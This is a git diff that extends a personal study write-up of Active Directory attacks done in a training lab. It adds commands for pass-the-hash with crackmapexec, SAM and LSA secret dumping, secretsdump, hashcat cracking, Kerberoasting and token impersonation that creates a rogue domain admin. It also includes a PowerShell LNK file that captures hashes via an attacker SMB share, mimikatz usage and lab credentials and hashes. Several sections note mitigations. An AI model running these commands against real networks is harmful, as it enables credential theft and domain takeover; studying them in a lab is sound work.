@@ -100,6 +100,8 @@ We can see the smb relay try to relay itself to THEPUNISHER machine but didn't w
 
 ![image](https://github.com/user-attachments/assets/c1d1df9b-f01a-4ff1-9d93-d6b974df9034)
 
+Local Admin hash: **aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f**
+
 We have admin hash and local admin hash which is peterparker here. IRL pentest, we will note this down as a finding
 
 Another attack apart from SAM dump would be to spawn an interactive shell
@@ -364,6 +366,257 @@ We can check the index.html to see comprehensive report
 # Pass Attacks
 Let's try with crackmapexec to pass the credential of fcastle to see which machine that we have local admin privilege, see that there are 2 machines which includes THEPUNISHER and SPIDERMAN are successfully autenticate but not for HYDRA-DC since we have a valid cred that can login to that machine but we're not local admin on that DC
 
+## Crackmapexec
+
+```
+crackmapexec smb 192.168.85.0/24 -u fcastle -d MARVEL.local -p Password1
+```
+
 ![image](https://github.com/user-attachments/assets/6610db3c-d93a-4906-880e-469153a50985)
 
 Now that we can access to these machines we want to dump out information using secretdumps
+
+But for now, let's do pass the hash from local admin hash we got earlier
+
+```
+crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
+```
+
+![image](https://github.com/user-attachments/assets/3dc0bf98-e843-4fcc-b732-810f542c82d8)
+
+See that we can authenticate into 2 machines since they have the same local admin password as Password1! but DC doesn't have this as a password that's why it failed 
+
+--sam will dump out SAM hashes for us
+
+```
+crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
+```
+
+![image](https://github.com/user-attachments/assets/9de5c351-c901-4152-a46c-3e1ad88bbc3f)
+
+--shares can enumerate shares on each machines
+
+```
+crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
+```
+
+![image](https://github.com/user-attachments/assets/e8d01ee8-e0fc-4364-8b5e-0e24ef4b72a0)
+
+These shares are not the share we're connected too but it's a share that exists on the network that offer us that we can connect too
+
+we can also dump lsass secrets using --lsa
+
+```
+crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
+```
+
+![image](https://github.com/user-attachments/assets/e67b553d-40b5-47b2-a4c4-abc6041b4d3a)
+
+This will show account that has logged into the machine see that we have domain admin hash here since we use that account to login to the machine before the problem wiht this is that this may be stored for months or weeks so the password might has already been reset to something else
+
+We can see all modules using
+```
+crackmapexec smb -L
+```
+Then we can try to use lsassy module here which is the best one to look for recent login users
+```
+crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
+```
+![image](https://github.com/user-attachments/assets/9b42f382-fef3-4581-9ccf-0e399282d4c7)
+
+We can view crackmapexec database using cmedb
+
+![image](https://github.com/user-attachments/assets/4728691a-0b67-4c8b-8984-d2e6f4f18da4)
+
+## Dumping and Cracking Hashes
+Using secretsdump
+
+```
+secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.85.147
+```
+
+![image](https://github.com/user-attachments/assets/844927cb-a5fc-4692-96a4-a51b157a699f)
+
+See that we can't see the password in clear text but in older windows version or legacy version, the protocol called wdigest can dump the passwords out in clear text which is disable in a newer version which can be enabled
+
+We can force the switch to be on for wdigest and wait for someone to login then switch it off IRL pentest 
+
+PTH attack is also possible
+
+```
+secretsdump.py administrator:@192.168.85.147 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+```
+So far the thought process is like this:
+
+![image](https://github.com/user-attachments/assets/22922fe6-faf1-4aaf-b1ff-a3fe12e8e5f6)
+
+we can get the last part to crack the password
+
+```
+hashcat -m 1000 '7facdc498ed1680c4fd1448319a8c04f' /usr/share/wordlists/rockyou.txt
+```
+
+![image](https://github.com/user-attachments/assets/ac0cd1d2-39f0-41cb-925d-671c76c17501)
+
+## Pass Attack Mitigations 
+
+![image](https://github.com/user-attachments/assets/e1eccc16-6434-4886-aef2-c29043843218)
+
+Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>
+
+# Kerberoasting
+## Kerberoasting Attack
+
+```
+sudo GetUserSPNs.py MARVEL.local/fcastle:'Password1' -dc-ip 192.168.85.156 -request
+```
+
+We can use any domain associated account but since we have the user account fcastle so we'll just use it to perform kerberoasting
+
+![image](https://github.com/user-attachments/assets/42742bc9-58ba-4b51-b6b9-2296d532ef72)
+
+If the last logon is never, it might be a honeypot account so be careful
+
+It doesn't tell us that the service is running in domain admin group but most of the time, the service account will be running in domain admin group
+
+We can grab the whole hashes and crack it 
+
+```
+hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
+```
+
+![image](https://github.com/user-attachments/assets/87c6bcda-2503-4218-bba6-25da4bc9cfbf)
+
+We can use this cred to compromise the domain since this is the domain admin account
+
+## Kerberoasting Mitigation 
+
+![image](https://github.com/user-attachments/assets/7087a6a3-7957-4716-acfc-2f339e1eaad5)
+
+Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>
+
+We shouldn't store the creds in AD description and don't give it a domain admin privilege
+
+# Token Impersonation
+## Token Impersonation Attack
+We will use incognito, before that we need to get meterpreter shell using psexec and set these value before run the exploit
+
+![image](https://github.com/user-attachments/assets/9b305b9c-c423-4ec6-ae11-51f8a74210d0)
+
+Make sure to login to THEPUNISHER machine with domain fcastle account before running incognito since No Active User = No Active Tokens: If no user is signed in, there will be no access tokens available to impersonate.
+
+There are a bunch of modules we can load in but in this case, we'll go with incognito
+
+![image](https://github.com/user-attachments/assets/2e3358dd-eb22-4107-8fd6-d48cf30da9e2)
+
+Let's try to impersonate fcastle since we are system right now
+
+![image](https://github.com/user-attachments/assets/a2072c6b-ca16-4935-8e14-465293e3be6d)
+
+For some reason when I tried to impersonte a token it errors out but then I check with whoami again, I got the fcastle token impersonated
+
+![image](https://github.com/user-attachments/assets/664b0b20-e2fb-48f7-99d8-cb734d5f10fc)
+
+Can use rev2self to reverse back to nt system
+
+![image](https://github.com/user-attachments/assets/15e1aeba-d7ad-47e4-a92a-5120274e040b)
+
+Now let's try login to the machine with domain admin account instead MARVEL\administrator:P@$$w0rd! and list tokens we can impersonate again
+
+![image](https://github.com/user-attachments/assets/9e431d02-c0c0-4112-9868-3d5a2a77abfb)
+
+Impersonate the token and we'll create POC by creating a new user **hawkeye:Password1@** and add him to domain group
+
+```
+PS C:\Users\administrator> net user /add hawkeye Password1@ /domain
+The request will be processed at a domain controller for domain MARVEL.local.
+
+The command completed successfully.
+
+PS C:\Users\administrator> net group "Domain Admins" hawkeye /ADD /DOMAIN
+The request will be processed at a domain controller for domain MARVEL.local.
+
+The command completed successfully.
+```
+
+![image](https://github.com/user-attachments/assets/523994ca-cf30-422b-9650-b808ff01e353)
+
+we can proof if hawkeye has domain admin rights by trying to do secretsdump on DC which a normal user shouldn't be able to do
+
+![image](https://github.com/user-attachments/assets/aa81e297-9500-4fc4-97ce-d2ef274aa0e8)
+
+![image](https://github.com/user-attachments/assets/1acc29aa-84f9-4fbe-ba22-f6871915d617)
+
+A bunch of info we got
+
+## Token Impersonation Mitigation
+
+![image](https://github.com/user-attachments/assets/f35f6190-25af-416f-a602-9f72283efa26)
+
+Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>
+
+Prevent Domain controller from accessing a machine
+
+# LNK File Attack
+We don't need to perform this on victim's machine, it can be perform anywhere
+
+```
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\192.168.85.56\@test.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.HotKey = "Ctrl+Alt+T"
+$lnk.Save()
+```
+
+![image](https://github.com/user-attachments/assets/6d11921f-078d-4e79-a57f-e72a99e66974)
+
+After create the file link, append the file name with either @ or ~ so that the file gets push to the top view and copy to HYDRA-DC share inside hackme folder
+
+![image](https://github.com/user-attachments/assets/c81e96aa-66af-4d63-a83e-2cb19638b7f1)
+
+When we try to access hackme folder, the hash will be captured by responder (don't even need to run the file)
+
+![image](https://github.com/user-attachments/assets/ee2f03b6-8063-4ac2-bfec-08d988709d0b)
+
+we can also use netexec to set up link attack but the lab is not configured to expose the share to crackmapexec or netexec so this won't work
+
+```
+netexec smb 192.168.85.147 -d marvel.local -u fcatle -p Password1 -M slinky -o NAME=test SERVER=our-ip
+
+```
+
+reminder that -M slinky will see if there is an accessible share for that user and create the test file to upload onto the share for us
+
+# Credential Dumping with Mimikatz
+
+First, transport mimikatz x64 into the machine by hosting a python server and make sure to keep the file after download
+
+![image](https://github.com/user-attachments/assets/95059d23-accc-4b73-84f6-786f7cdefada)
+
+now open cmd with admin privilege and run mimikatz then set privilege mode to debug since most of the attacks require that
+
+![image](https://github.com/user-attachments/assets/514920c9-ba63-482a-8e1e-ed6d2131fc27)
+
+![image](https://github.com/user-attachments/assets/d0c328d3-0053-43a0-a7c4-ae1c0ac434ee)
+
+we can see what we can do with sekurlsa but we will try with logonPasswords
+
+![image](https://github.com/user-attachments/assets/3de3a071-7ebd-4a59-83b2-b246d5ec46fa)
+
+We saw domain admin password stores in cred manager here. Recall that we have a file share Z that automatically connects to our accounts and is revealing domain admin password in cleartext because of that connection
+
+![image](https://github.com/user-attachments/assets/ec4c953c-42cb-4eae-a437-252dc4fa7ab1)
+
+![image](https://github.com/user-attachments/assets/4d347ad0-2306-476e-b851-6af19b76fc10)
+
+# Dumping the NTDS.dit
+
+
+
+
+
+
+
